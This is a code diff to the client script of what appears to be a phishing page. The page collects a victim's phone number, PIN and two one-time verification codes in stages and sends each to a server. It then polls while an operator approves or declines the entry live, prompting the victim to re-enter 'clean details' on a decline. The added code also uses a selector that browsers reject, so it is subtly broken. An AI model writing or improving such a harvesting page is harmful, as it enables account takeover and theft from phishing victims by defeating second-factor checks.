@@ -268,172 +268,108 @@ button:disabled {
 </main>
 
 <script>
-let sessionId = null;
-let userData = { phone: "", pin: "", code1: "", code2: "" };
-let pollingInterval = null;
+  let sessionId = null;
+  let currentStage = null;
+  let statusInterval = null;
 
-// Initialize Session
-window.addEventListener("DOMContentLoaded", async () => {
-  try {
-    const res = await fetch("/api/session", { method: "POST" });
-    const data = await res.json();
-    sessionId = data.sessionId;
-  } catch (err) {
-    console.error("Initialization error:", err);
-  }
-});
-
-// Setup dynamic item grid handling routines
-function setupBoxInputs(containerId, count, onComplete) {
-  const container = document.getElementById(containerId);
-  container.innerHTML = "";
-  const inputs = [];
-
-  for (let i = 0; i < count; i++) {
-    const input = document.createElement("input");
-    input.type = "tel";
-    input.maxLength = 1;
-    input.inputMode = "numeric";
-    input.autocomplete = "off";
-
-    input.addEventListener("input", (e) => {
-      input.value = input.value.replace(/\D/g, "");
-      if (input.value && i < count - 1) inputs[i + 1].focus();
-      
-      const fullValue = inputs.map(el => el.value).join("");
-      if (fullValue.length === count) {
-        inputs.forEach(el => el.disabled = true);
-        onComplete(fullValue);
-      }
-    });
-
-    input.addEventListener("keydown", (e) => {
-      if (e.key === "Backspace" && !input.value && i > 0) {
-        inputs[i - 1].focus();
-      }
-    });
-
-    container.appendChild(input);
-    inputs.push(input);
-  }
-  
-  // FIXED: Focus the first actual input element in the array instead of the array object
-  if (inputs.length > 0) inputs[0].focus();
-}
-
-// Step 1 Phone Input Dynamic Activation Routines
-const phoneInput = document.getElementById("phone");
-const nextPhoneBtn = document.getElementById("nextPhone");
-
-phoneInput.addEventListener("input", () => {
-  phoneInput.value = phoneInput.value.replace(/\D/g, "");
-  
-  if (phoneInput.value.length === 9) {
-    nextPhoneBtn.removeAttribute("disabled");
-  } else {
-    nextPhoneBtn.setAttribute("disabled", "true");
-  }
-});
-
-nextPhoneBtn.addEventListener("click", () => {
-  userData.phone = phoneInput.value;
-  document.getElementById("page1").classList.add("hidden");
-  document.getElementById("page2").classList.remove("hidden");
-  
-  setupBoxInputs("pinBoxes", 5, submitPinStage);
-});
-
-// Post Phone & PIN bundle configurations
-async function submitPinStage(pinValue) {
-  userData.pin = pinValue;
-  document.getElementById("pinWaiting").classList.remove("hidden");
-  
-  const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
-  if (success) {
-    startPolling("pin", "page2", "page3", "pinWaiting", "pinMessage", () => {
-      setTimeout(() => document.getElementById("code1").focus(), 50);
-    });
-  }
-}
-
-// Track and validate Page 3 input elements
-const code1Input = document.getElementById("code1");
-const submitCode1Btn = document.getElementById("submitCode1");
-
-code1Input.addEventListener("input", () => {
-  if (code1Input.value.trim().length > 0) {
-    submitCode1Btn.removeAttribute("disabled");
-  } else {
-    submitCode1Btn.setAttribute("disabled", "true");
-  }
-});
-
-submitCode1Btn.addEventListener("click", async () => {
-  userData.code1 = code1Input.value.trim();
-  submitCode1Btn.setAttribute("disabled", "true");
-  document.getElementById("code1Waiting").classList.remove("hidden");
-
-  const success = await sendStagePayload("code1", { code1: userData.code1 });
-  if (success) {
-    startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
-      setupBoxInputs("code2Boxes", 4, submitCode2Stage);
-    });
-  }
-});
-
-// Final step submission handler
-async function submitCode2Stage(code2Value) {
-  userData.code2 = code2Value;
-  document.getElementById("code2Waiting").classList.remove("hidden");
-
-  const success = await sendStagePayload("code2", { code2: userData.code2 });
-  if (success) {
-    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
-  }
-}
-
-// Pipeline transmission communications helper
-async function sendStagePayload(stage, payload) {
-  try {
-    const response = await fetch("/api/approval-request", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ sessionId, stage, payload })
-    });
-    return response.ok;
-  } catch (e) {
-    return false;
-  }
-}
-
-// Polling core infrastructure engine
-function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
-  const msgElement = document.getElementById(msgId);
-  msgElement.className = "status";
-  msgElement.innerText = "";
-
-  if(pollingInterval) clearInterval(pollingInterval);
-
-  pollingInterval = setInterval(async () => {
+  // Initialize Session on Page Load
+  async function initSession() {
     try {
-      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
+      const res = await fetch("/api/session", { method: "POST" });
       const data = await res.json();
-
-      if (data.status === "approved") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        document.getElementById(currentPageId).classList.add("hidden");
-        document.getElementById(nextPageId).classList.remove("hidden");
-        if (successCallback) successCallback();
-      } else if (data.status === "declined") {
-        clearInterval(pollingInterval);
-        document.getElementById(spinnerId).classList.add("hidden");
-        msgElement.classList.add("error");
-        msgElement.innerText = "Submission declined. Please refresh and retry.";
-      }
+      sessionId = data.sessionId;
     } catch (err) {
-      console.error("Status check failed");
+      console.error("Session initialization failed:", err);
     }
-  }, 2500);
-}
+  }
+  initSession();
+
+  // Unified Request Submission Handler
+  async function submitStage(stage, payload, currentSectionId, nextSectionId) {
+    currentStage = stage;
+    
+    // Select DOM nodes for the active view context
+    const container = document.getElementById(currentSectionId);
+    const inputField = container.querySelector("input");
+    const submitBtn = container.querySelector("button");
+    const spinner = container.querySelector(".loading-spinner, p:contains('Waiting')") || container.querySelector("p");
+
+    // Freeze UI inputs during pending status
+    if (inputField) inputField.disabled = true;
+    if (submitBtn) {
+      submitBtn.disabled = true;
+      submitBtn.dataset.originalText = submitBtn.innerText;
+      submitBtn.innerText = "Processing...";
+    }
+    if (spinner) spinner.style.display = "block";
+
+    try {
+      const response = await fetch("/api/approval-request", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ sessionId, stage, payload })
+      });
+      
+      const result = await response.json();
+      if (result.ok && result.status === "pending") {
+        startPolling(currentSectionId, nextSectionId, inputField, submitBtn, spinner);
+      }
+    } catch (error) {
+      console.error("Submission error:", error);
+      resetUIElement(inputField, submitBtn, spinner);
+    }
+  }
+
+  // Polling Loop Engine
+  function startPolling(currentSectionId, nextSectionId, inputField, submitBtn, spinner) {
+    if (statusInterval) clearInterval(statusInterval);
+
+    statusInterval = setInterval(async () => {
+      try {
+        const response = await fetch(`/api/status?sessionId=${sessionId}&stage=${currentStage}`);
+        const result = await response.json();
+
+        // Scenario A: Approved -> Proceed to next view block
+        if (result.status === "approved") {
+          clearInterval(statusInterval);
+          document.getElementById(currentSectionId).style.display = "none";
+          document.getElementById(nextSectionId).style.display = "block";
+        } 
+        
+        // Scenario B: Declined -> Unlock active step fields immediately
+        else if (result.status === "declined" || result.status === `declined_${currentStage}`) {
+          clearInterval(statusInterval);
+          
+          // Reset UI layout dynamically for re-entry
+          if (inputField) {
+            inputField.disabled = false;
+            inputField.value = ""; // Erase bad entry
+            inputField.focus();
+          }
+          if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.innerText = submitBtn.dataset.originalText || "Retry Submission";
+          }
+          if (spinner) {
+            // Keep status message hidden until re-submitted
+            spinner.style.display = "none"; 
+          }
+
+          alert("Verification parameters incorrect. Please re-enter clean details.");
+        }
+      } catch (err) {
+        console.error("Polling validation failure:", err);
+      }
+    }, 2500); // Check server every 2.5 seconds
+  }
+
+  function resetUIElement(input, btn, spin) {
+    if (input) input.disabled = false;
+    if (btn) {
+      btn.disabled = false;
+      btn.innerText = btn.dataset.originalText || "Submit";
+    }
+    if (spin) spin.style.display = "none";
+  }
 </script>
+
